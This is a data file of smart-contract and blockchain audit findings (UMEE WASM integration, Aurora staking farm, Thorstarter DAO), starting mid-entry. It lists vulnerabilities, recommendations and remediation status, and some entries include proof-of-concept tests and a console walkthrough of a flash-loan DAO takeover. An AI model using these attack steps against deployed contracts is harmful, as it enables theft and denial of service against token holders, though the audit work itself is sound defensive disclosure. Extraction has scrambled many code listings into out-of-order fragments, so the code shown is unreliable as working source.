11 12  c98217689d 13 14 15 16 17 18 19 20 21 22 23 24 25 26 github . com / CosmWasm / wasmd v0 .25.0 github . com / CosmWasm / wasmvm v1 .0.0 - beta10 github . com / cosmos / cosmos - sdk v0 .45.6 github . com / cosmos / go - bip39 v1 .0.0 github . com / cosmos / ibc - go / v2 v2 .3.0 github . com / ethereum /go - ethereum v1 .10.19 github . com / gogo / protobuf v1 .3.3 github . com / golang / protobuf v1 .5.2 github . com / golangci / golangci - lint v1 .47.1 github . com / gorilla / mux v1 .8.0 github . com / grpc - ecosystem / grpc - gateway v1 .16.0 github . com / hashicorp / golang - lru v0 .5.5 -0.20210104140557 -80 github . com / ignite / cli v0 .22.2 github . com / ory / dockertest / v3 v3 .9.1 github . com / osmosis - labs / bech32 - ibc v0 .2.0 - rc2 github . com / rs / zerolog v1 .27.0 github . com / spf13 / cast v1 .5.0 github . com / spf13 / cobra v1 .5.0 github . com / spf13 / pflag v1 .0.5 github . com / spf13 / viper v1 .12.0 github . com / stretchr / testify v1 .8.0 github . com / tendermint / tendermint v0 .34.19 github . com / tendermint / tm - db v0 .6.7 google . golang . org / genproto v0 .0.0 -20220519153652 -3 a47de7e79bd google . golang . org / grpc v1 .46.2 gopkg . in / yaml . v3 v3 .0.1 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The following update has been released for cosmos-sdk & wasm which should be applied before this integration is released publicly: 18 PR 12692 Wasm Fix Cosmos SDK Update Take note that this has been fixed in the latest version of cosmos-sdk & wasm, but deploying this upgrade might have unintended consequences. Remediation Plan: PENDING: The UMEE Team does not allow contracts to be executed without permission on the chain, they will consider fixing in the future. 19 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Critical"
        ]
    },
    {
        "title": "WASM CONFIG PARAMETERS ARE NOT COMPATIBLE WITH RECENT COSMWASM SDK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the code review, It has been noticed that the pre-defined param- eters are incompatible with the recent wasmd keeper. From the following link, DefaultCompileCost is incompatible with recent wasmd module. On the other hand, DefaultGasMultiplier is not defined. Code Location: Location Listing 5 1 const ( 2  wasmd 3 4 5 6 ) // DefaultUmeeWasmInstanceCost is initially set the same as in DefaultUmeeWasmInstanceCost uint64 = 60 _000 // DefaultUmeeWasmCompileCost cost per byte compiled DefaultUmeeWasmCompileCost uint64 = 100 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Ensure that all selected values are compatible with recent wasmd and will not lead to any inconsistency on the integration. 20 Remediation Plan: PENDING: The UMEE Team will fix this issue in a future release. 21 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Low"
        ]
    },
    {
        "title": "NEW QUERIES ARE NOT ADDED INTO THE HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "SlashWindow In the recent branch, SlashWindow query has been added. queries the current slash window progress of the oracle. However, the query is not added into the wasm handlers. Code Location: Location Listing 6 return nil , status . Error ( codes . InvalidArgument , \" empty } if req == nil { goCtx context . Context , req * types . QuerySlashWindow , ctx := sdk . UnwrapSDKContext ( goCtx ) params := q . GetParams ( ctx ) 1 func ( q querier ) SlashWindow ( 2 3 4 ) (* types . QuerySlashWindowResponse , error ) { 5 6  request \" ) 7 8 9 10 11 12 13 14 15 16 17 18  slashWindow ) 19 20 21 22 23 } return & types . QuerySlashWindowResponse { }, nil slashWindow := params . SlashWindow votePeriod := params . VotePeriod currentBlock := uint64 ( ctx . BlockHeight () ) votePeriodsPerSlashWindow := slashWindow / votePeriod currentSlashWindow := currentBlock / votePeriodsPerSlashWindow blocksIntoSlashWindow := currentBlock - ( currentSlashWindow * WindowProgress : blocksIntoSlashWindow / votePeriod , 22 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to handle all available GRPC queries through wasm. Remediation Plan: PENDING: The UMEE Team will fix this issue in a future release. 23 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Low"
        ]
    },
    {
        "title": "VULNERABLE 3RD PARTY PACKAGES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are a few 3rd party packages that are being used that contain vulnerabilities. Packages: ID sonatype-2021-0598 sonatype-2022-3945 sonatype-2021-0456 sonatype-2021-0076 CVE-2022-23328 Package tendermint go-buffer-poo websocket go-ethereum go-ethereum Rating MEDIUM MEDIUM HIGH HIGH HIGH Description Improper Input Validation Integer Overflow or Wraparound Uncontrolled Resource Consumption Uncontrolled Resource Consumption Denial of Service attack Risk Level: Likelihood - 1 Impact - 2 Recommendation: We recommend that all third-party packages that are implemented are kept up to date and all security fixes applied. Remediation Plan: PENDING: The UMEE Team will fix this issue in a future release. 24 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNHANDLED ERRORS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are a few instances where error handling has not been implemented for functions that might return an error. Code Location: price-feeder/oracle/provider/huobi.go, Lines 384-387 Listing 7: (Line 385) 384 func ( p * HuobiProvider ) reconnect () error { 385 386 387 p. wsClient . Close () p. logger . Debug () . Msg ( \" reconnecting websocket \" ) price-feeder/oracle/provider/gate.go, Lines 548-551 Listing 8: (Line 549) 548 func ( p * GateProvider ) reconnect () error { 549 550 551 p. wsClient . Close () p. logger . Debug () . Msg ( \" reconnecting websocket \" ) price-feeder/oracle/provider/coinbase.go, Lines 482-485 Listing 9: (Line 483) 482 func ( p * CoinbaseProvider ) reconnect () error { 483 484 485 p. logger . Debug () . Msg ( \" reconnecting websocket \" ) p. wsClient . Close () 25 price-feeder/oracle/provider/binance.go, Lines 362-366 Listing 10: (Line 363) 362 func ( p * BinanceProvider ) reconnect () error { 363 364 365 p. logger . Debug () . Msg ( \" reconnecting websocket \" ) p. wsClient . Close () Risk Level: Likelihood - 1 Impact - 1 Recommendation: We recommend that the appropriate error checking be implemented to avoid unexpected crashes. Remediation Plan: SOLVED: The UMEE Team has implemented the correct error handling on Issue 1192. 26 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Informational"
        ]
    },
    {
        "title": "DUPLICATED ERROR CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are two instances where an error check is not required, and the logic can be adjusted to only return the value. Code Location: x/leverage/types/tx.go, Lines 115-121 Listing 11: (Lines 117-120) _ , err := sdk . AccAddressFromBech32 ( msg . Borrower ) if err != nil { 115 func ( msg * MsgDecollateralize ) ValidateBasic () error { 116 117 118 119 120 121 } } return nil return err x/leverage/types/tx.go, Lines 86-92 Listing 12: (Lines 88-91) 86 func ( msg * MsgCollateralize ) ValidateBasic () error { _ , err := sdk . AccAddressFromBech32 ( msg . Borrower ) 87 88 if err != nil { 89 90 91 92 } } return nil return err 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: As the err variable will already be nil if no error has been generated by the function, the following piece of code will be sufficient: Listing 13 1 _ , err := sdk . AccAddressFromBech32 ( msg . Borrower ) 2 return err Remediation Plan: SOLVED: The UMEE Team has implemented the correct error handling on Issue 1194. 28 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Informational"
        ]
    },
    {
        "title": "HTML ESCAPING NOT IMPLEMENTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was found that Write is being used to generate HTTP responses, instead of using the html/template package that handles HTML and other encodings more safely. Code Location: price-feeder/router/v1/router.go, Line 113 Listing 14: (Line 113) 113 _ , _ = w. Write ( gr . Metrics ) price-feeder/router/v1/response.go, Line 48 Listing 15: (Line 48) 48 _ , _ = w . Write ( bz ) Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the html/template package when returning data back during an HTTP response. 29 Remediation Plan: SOLVED: The UMEE Team has implemented the correct error handling on Issue 1195. 30 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Informational"
        ]
    },
    {
        "title": "PANIC IS USED FOR ERROR HANDLING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Several instances of the panic function were identified in the codebase. They appear to be used to handle errors. This can cause potential issues, as invoking a panic can cause the program to halt execution and crash in some cases. This in turn can negatively impact the availability of the software for users. Code Location: The following are just a few samples of the usage of panic. x/leverage/abci.go, Lines 11-21 Listing 16: (Lines 13,17) } panic ( err ) if err := k . SweepBadDebts ( ctx ); err != nil { 11 func EndBlocker ( ctx sdk . Context , k keeper . Keeper ) [] abci .  ValidatorUpdate { 12 13 14 15 16 17 18 19 20 21 } if err := k . AccrueAllInterest ( ctx ); err != nil { return [] abci . ValidatorUpdate {} panic ( err ) } xx/leverage/keeper/keeper.go, Lines 64-66 Listing 17: (Line 65) 64 65 66 if k . hooks != nil { panic ( \" leverage hooks already set \" ) } 31 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Instead of using panics, custom errors should be defined and handled according to the Cosmos best practices. Remediation Plan: ACKNOWLEDGED: The UMEE Team acknowledged this finding. 32 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Informational"
        ]
    },
    {
        "title": "OPEN TODOs",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Open To-dos can point to architecture or programming issues that still need to be resolved. Often these kinds of comments indicate areas of complexity or confusion for developers. This provides value and insight to an attacker who aims to cause damage to the protocol. Code Location: TO-DO: Listing 18: Open Todos 1 ./ x / leverage / module . go :28:  implements simulator and then uncomment . 2 ./ x / leverage / keeper / interest . go :164: 3 ./ x / leverage / keeper / interest . go :76:  when tendermint solves #8773 // TODO : Ensure x / leverage // TODO : use typed events // @todo fix this Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider resolving the To-dos before deploying code to a production context. Use an independent issue tracker or other project management software to track development tasks. 33 Remediation Plan: ACKNOWLEDGED: The UMEE Team acknowledged this finding. 34 ",
        "labels": [
            "Halborn",
            "UMEE_WASM_Integration_Cosmos",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL01",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The unstake_burn() and burn() functions in staking-farm/src/stake.rs can be publicly callable by anyone, allowing malicious users to continu- ally call the functions with each new epoch, which leads to the reduction of the total stakes in the pool, which would result in fewer rewards for each user who stakes and the transfer of all unstaked tokens to address zero. Code Location: Listing 1: staking-farm/src/stake.rs 127 pub fn unstake_burn (& mut self ) { 128 self . internal_unstake_all (& AccountId :: new_unchecked (  ZERO_ADDRESS . to_string () )) ; 129 } Listing 2: staking-farm/src/stake.rs 132 pub fn burn (& mut self ) { 133 let account_id = AccountId :: new_unchecked ( ZERO_ADDRESS .  to_string () ); 134 135 136 137 138 139 } let account = self . internal_get_account (& account_id ); if account . unstaked > MIN_BURN_AMOUNT { // TODO : replace with burn host function when available . self . internal_withdraw (& account_id , account . unstaked ); } 15 Proof of Concept: The following test case was developed to showcase the issue: Listing 3 assert_all_success ( call! ( user1 , pool . unstake_burn () )) ; println! (\" Unstaked balance : {} \" , to_int ( view! ( pool . let ( root , pool ) = setup ( to_yocto (\" 5 \") , 1, 3) ; let user1 = create_user_no_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; wait_epoch (& root ); // User forces all of the zero address account 's tokens to be 1 fn public_token_burning () { 2 3 4 5 6 7  unstaked 8 9  get_account_unstaked_balance ( burn_account () )) )); 10  address account ( effectively burning them ) 11 12 13 14 15 16 17  get_account_unstaked_balance ( burn_account () )) )); 18 } wait_epoch (& root ); wait_epoch (& root ); wait_epoch (& root ); wait_epoch (& root ); assert_all_success ( call! ( user1 , pool . burn () )) ; // Zero address should have zero unstaked tokens println! (\" Unstaked balance : {} \" , to_int ( view! ( pool . // Wait for epochs before funds can be withdrawn to the zero Risk Level: Likelihood - 4 Impact - 5 Recommendation: Check if the owner is calling the functions before executing their logic, otherwise revert. 16 Remediation Plan: NOT APPLICABLE: The team accepts this behavior as it is intentional based on the reasoning at https://github.com/referencedev/staking-farm# burning-rewards 17 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: High"
        ]
    },
    {
        "title": "HAL02",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that most of the privileged functionality is controlled by the owner. Additional authorization levels are needed to implement the principle of least privilege, also known as least authority, which ensures that only authorized processes, users, or programs can access necessary resources or information. Role ownership is useful in a simple system, but more complex projects require more roles by using role-based access control policy. Code Location: The owner can access those functions:  stop_farm function in farm.rs  All functions in owner.rs Risk Level: Likelihood - 3 Impact - 5 Recommendation: Adding additional roles is recommended to adhere to the principle of least privilege and limit owner privileges. You can include the pauser role and change assert_owner_or_authorized_user() to allow only authorized users to perform actions. Also, do not allow the owner to be set as an authorized user via add_authorized_user. 18 Remediation Plan: pauser permissions PARTIALLY SOLVED: The Aurora team introduced a fix that separates owner https://github.com/referencedev/staking- and farm/pull/11. However, the fix is partial, since the owner can still become a pauser and the pausers list could become empty by removing all pausers. in 19 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: High"
        ]
    },
    {
        "title": "HAL03",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The internal_restake() function in staking-farm/src/internal.rs checks if the contract is paused before performing its internal logic, however multiple functions that perform other staking actions do not perform that check before execution, allowing staking actions to be carried out even when staking is paused. Such functions include internal_stake() and inner_unstake(). Risk Level: Likelihood - 2 Impact - 5 Recommendation: All functions that perform logic that affects staking actions should start by checking whether the contract is paused or not. Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 20 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "HAL04",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When a new instance of StakingContract is created, a burn fraction has to be provided and is then used to determine the amount of tokens burned with each call to the ping() function. An assert_valid() function is implemented on the Ratio struct that represents the fraction, however it is never called on the passed fraction value before it is used in the StakingContract. This allows an owner to carry out the following scenarios: Create a staking pool with a burn fraction that evaluates to 1, 1. meaning all rewards will be burned and nothing will remain for the owner and delegators 2. Create a staking pool with a burn fraction that evaluates to more than 1, which will cause a panic case every time internal_ping() is called Create a staking pool with a burn fraction that evaluates to 0, 3. meaning nothing will ever burn, which would allow the owner to basically harvest all the rewards if they set the reward fee to a fraction that evaluates to 1 Code Location: Listing 4: staking-farm/src/lib.rs (Lines 198,221) pub fn new ( owner_id : AccountId , stake_public_key : PublicKey , reward_fee_fraction : Ratio , burn_fee_fraction : Ratio , ) -> Self { 193 #[ init ] 194 195 196 197 198 199 200 201 202 assert! ( !env :: state_exists () , \" Already initialized \" ); reward_fee_fraction . assert_valid () ; assert! ( 21 203 204 205 206 207 env :: is_valid_account_id ( owner_id . as_bytes () ) , \" The owner account ID is invalid \" ); let account_balance = env :: account_balance () ; let total_staked_balance = account_balance -  STAKE_SHARE_PRICE_GUARANTEE_FUND ; 208 209 210 211 assert_eq! ( env :: account_locked_balance () , 0, \" The staking pool shouldn 't be staking at the  initialization \" 212 213 214 215 216 217 218 ); let mut this = Self { stake_public_key : stake_public_key . into () , last_epoch_height : env :: epoch_height () , last_total_balance : account_balance , total_staked_balance , total_stake_shares : NumStakeShares :: from (  total_staked_balance ) , 219 220 total_burn_shares : 0, reward_fee_fraction : UpdatableRewardFee :: new (  reward_fee_fraction ) , 221 222 223 224 225 226 burn_fee_fraction , accounts : UnorderedMap :: new ( StorageKeys :: Accounts ) , farms : Vector :: new ( StorageKeys :: Farms ) , active_farms : Vec :: new () , paused : false , authorized_users : UnorderedSet :: new ( StorageKeys ::  AuthorizedUsers ) , 227 authorized_farm_tokens : UnorderedSet :: new ( StorageKeys  :: AuthorizedFarmTokens ) , 228 }; Proof of Concept:: Test cases were done and indeed they resulted in 0 rewards, panic and the owner collected the full reward for the 3 cases mentioned above, respectively: 22 Listing 5: Burning all rewards let ( root , pool ) = setup ( to_yocto (\" 10000 \" ) + 1 _000_000_000_000 1 fn burn_all_rewards () { 2  , 10 , 10) ; 3 4 5 6 7 8 9 } let _ = create_user_and_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; Listing 6: Panic on every ping() function call let ( root , pool ) = setup ( to_yocto (\" 10000 \" ) + 1 _000_000_000_000 1 fn panic_on_ping () { 2  , 10 , 11) ; 3 4 5 6 } let _ = create_user_and_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; Listing 7: Owner getting all rewards let ( root , pool ) = setup ( to_yocto (\" 10000 \" ) + 1 _000_000_000_000 let mut root_balance = to_int ( view! ( pool . let user1 = create_user_and_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; 1 fn owner_gets_all_rewards () { 2  , 10 , 0) ; 3 4 5 6 7  get_account_total_balance ( root . account_id () )) ); 8  get_account_total_balance ( user1 . account_id () )) ); 9 10  root_balance , user_balance ); 11 12 13 14 wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; let mut user_balance = to_int ( view! ( pool . log! ( \" First iteration : Root balance : {}\\ nUser balance : {} \" , 23 root_balance = to_int ( view! ( pool . get_account_total_balance ( user_balance = to_int ( view! ( pool . get_account_total_balance ( 15  root . account_id () ))); 16  user1 . account_id () )) ); 17 18  root_balance , user_balance ); 19 } log! ( \" Second iteration : Root balance : {}\\ nUser balance : {} \" , Risk Level: Likelihood - 2 Impact - 5 Recommendation: The assert_valid() function must be called before the fraction is used to create the StakingContract instance. Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 24 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "HAL05",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "This behavior exists in multiple areas of the project, for example in the multiply() function implemented for the Ratio struct in staking- farm/src/lib.rs. It is required to enforce that the ratio is valid. Code Location: Listing 8: staking-farm/src/lib.rs if self . denominator == 0 || self . numerator == 0 { 175 pub fn multiply (& self , value : Balance ) -> Balance { 176 177 178 179 0 } else { ( U256 :: from ( self . numerator ) * U256 :: from ( value ) / U256  :: from ( self . denominator )) 180 181 182 } } . as_u128 () Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ratio validation should always take place to avoid cases of overflow. 25 Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 26 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL06",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "is equal to env::predecessor_account_id(). It was observed that the claim() function accepts that delegator_id Enabling this will cause the smart contract to perform a redundant operation of doing a cross contract call to the delegator and then setting claim_account_id and send_account_id to the same value in internal_claim(). Code Location:  staking-farm/src/farm.rs: claim() Recommendation: Consider avoid redundant operations. asserting delegator_id != env::predecessor_account_id() to Remediation Plan: NOT APPLICABLE: The Aurora team will not fix since it does not pose a direct risk and updating the code might introduce other bugs. 27 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL07",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following crates used in the project dependencies have known vulner- abilities: ID RUSTSEC-2020-0159 package chrono RUSTSEC-2021-0067 RUSTSEC-2021-0013 RUSTSEC-2021-0089 cranelift- codegen raw-cpuid raw-cpuid RUSTSEC-2022-0013 regex RUSTSEC-2020-0071 RUSTSEC-2021-0110 time wasmtime Recommendation: Short Description Potential segfault in localtime_r invoca- tions Memory access due to code generation flaw in Cranelift module Soundness issues in raw-cpuid Optional lacking validation Regexes with large repetitions on empty sub- expressions take a very long time to parse Potential segfault in the time crate Multiple Vulnerabilities in Wasmtime implementations Deserialize Even if those vulnerable crates cannot affect the underlying application, it is recommended to be aware of them. Furthermore, you need to configure dependency monitoring to always be alert when a new vulnerability is disclosed in one of the project crates. Remediation Plan: RISK ACCEPTED: The Aurora team accepted the risk of this finding; however, no fixes were introduced as the affected crates are not under the teams control. 28 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL08",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The deposit() function does not assert that the attached deposit works. Users can call this function without attaching a deposit by making the amount zero in the internal_deposit function. Code Location:  staking-farm/src/stake.rs: deposit() Recommendation: It is advised to assert at least one to avoid any redundant calls to that function. Remediation Plan: NOT APPLICABLE: The Aurora team decided this will not be fixed since it does not pose a direct risk. 29 ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL09",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the new function, an assert prevents anyone from re-initializing the contract. However, since the #[init] macro is used, this check is redundant. Code Location: Listing 9: staking-farm/src/lib.rs (Line 200) 193 194 195 196 197 198 199 200 201 202 #[ init ] pub fn new ( owner_id : AccountId , stake_public_key : PublicKey , reward_fee_fraction : Ratio , burn_fee_fraction : Ratio , ) -> Self { assert! ( !env :: state_exists () , \" Already initialized \" ); reward_fee_fraction . assert_valid () ; ... Recommendation: Consider removing that assertion to avoid redundant code. Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 30 3.10 (HAL-10) HAL10 - ASSERTION SHOULD BE REPLACED BY A MACRO - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Aurora_Staking_Farm_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "WRONG CONSTANT USED IN EMISSIONSSPLITTER.SOL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The contract EmissionsSplitter receives XRUNE token emissions and then calls the run() function to split up its current balance between the private investors, teams, DAO and ecosystem contracts/addresses following their respective vesting curves. These are the vesting curves: As we can see, for the teams there is a total of 110,000,000 tokens. In the contract, we can see defined that in the first half (2 years) 66,000,000 of these tokens will be given, and then, on the second half, the rest (44,000,000 tokens): 15 Listing 1: EmissionsSplitter.sol (Lines 24,25) 21 22 23 24 25 26 uint public constant ONE_YEAR = 31536000; uint public constant INVESTORS_EMISSIONS_HALF1 = 45000000 e18 ; uint public constant INVESTORS_EMISSIONS_HALF2 = 30000000 e18 ; uint public constant TEAM_EMISSIONS_HALF1 = 66000000 e18 ; uint public constant TEAM_EMISSIONS_HALF2 = 44000000 e18 ; uint public constant ECOSYSTEM_EMISSIONS = 250000000 e18 ; In the function run() we can see that the constant TEAM_EMISSIONS_HALF1 is being used incorrectly instead of TEAM_EMISSIONS_HALF2. Code Location: Listing 2: EmissionsSplitter.sol (Lines 103,107) 89 uint sentToTeamNow = 0; 90 { 91 92 // Team get 66 M tokens linearly over the first 2 years uint teamProgress = _min ((( block . timestamp - emissionsStart ) * 1 e12 ) / (2 * ONE_YEAR ) , 1 e12 ); 93 uint teamUnlocked = ( teamProgress * TEAM_EMISSIONS_HALF1 ) / 1 94 95 96 97 98 99 100 101 } 102 { 103 104 105 106 107 108 e12 ; uint teamAmount = _min ( teamUnlocked - sentToTeam , amount ); if ( teamAmount > 0) { sentToTeamNow += teamAmount ; sentToTeam += teamAmount ; amount -= teamAmount ; token . safeTransfer ( team , teamAmount ); } // Team get their remaining 44 M tokens linearly over the next 2 years uint elapsed = block . timestamp - emissionsStart ; elapsed -= _min ( elapsed , 2 * ONE_YEAR ); uint teamProgress = _min (( elapsed * 1 e12 ) / (2 * ONE_YEAR ) , 1 e12 ); uint teamUnlocked = ( teamProgress * TEAM_EMISSIONS_HALF1 ) / 1 e12 ; uint teamAmount = _min ( teamUnlocked - _min ( teamUnlocked , sentToTeam ) , amount ); 16 109 110 111 112 113 114 115 } if ( teamAmount > 0) { sentToTeamNow += teamAmount ; sentToTeam += teamAmount ; amount -= teamAmount ; token . safeTransfer ( team , teamAmount ); } Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to replace TEAM_EMISSIONS_HALF1 with TEAM_EMISSIONS_HALF2 constant in line 107 of EmissionsSplitter.sol. Remediation Plan: SOLVED: TEAM_EMISSIONS_HALF2. Thorstarter Team currently uses the right constant 17 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: High"
        ]
    },
    {
        "title": "DOS/CONTRACT TAKEOVER ON DAO.SOL CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "DAO.sol contract allows the creation of different proposals including the following features:  Add support for pools: multiple options per proposal instead of just a for/against  Support multiple actions per option. So multiple transactions can be executed by one proposal  Use a voters contract to snapshot voting power, the address used The voting power is based on the locked XRUNE can be updated. (vXRUNE/voting token). its reconfigure  Can own parameters: minBalanceToPropose, minPercentQuorum, minVotingTime, minExecutionDelay  The execute method can be called by anybody if the proposal is passed and not yet executed Based on this, by doing a flash loan an attacker could: - Case 1: Cause a DOS in the contract - Case 2: Take total control of the DAO.sol contract The DAO.sol contract makes use of this Voters.sol contract to handle the voting for the different proposals, and as such, we have included this vulnerability in the report. Case 1: Cause a DOS in the contract - Manual test: In this case we have followed these steps to cause a DOS in the contract: 1. Perform a flash loan of XRUNEs and lock all those XRUNEs tokens so we obtain more than the 50% of the total voting power 2. Create a proposal which calls Voters.toggleSnapshotter(DAO address) 18 3. Return the flash loan 4. Give it our vote 5. Execute it This way, the contract DAO.sol will lose the snapshotters role in the Voters contract which is required to create a new proposal. Right after this call, no new proposals can be created. Listing 3: DOS through toggleSnapshotter() (Lines 64,67,76) 1 # Deploying test Token contracts 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # DAO contract should be a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 >>> user1 = accounts [1] 17 >>> XRuneToken [0]. transfer ( user1 . address , 33) 18 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 19 >>> Voters [0]. lock (33 , { ' from ': user1 }) 20 21 ## user2 16% of voting power 22 >>> user2 = accounts [2] 23 >>> XRuneToken [0]. transfer ( user2 , 16) 24 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 25 >>> Voters [0]. lock (16 , { ' from ': user2 }) 26 27 # attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power 28 >>> attacker = accounts [9] 19 29 >>> XRuneToken [0]. transfer ( attacker , 51) 30 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 31 >>> Voters [0]. lock (51 , { ' from ': attacker }) 32 33 # Voting power 34 >>> print (\" votes ( user1 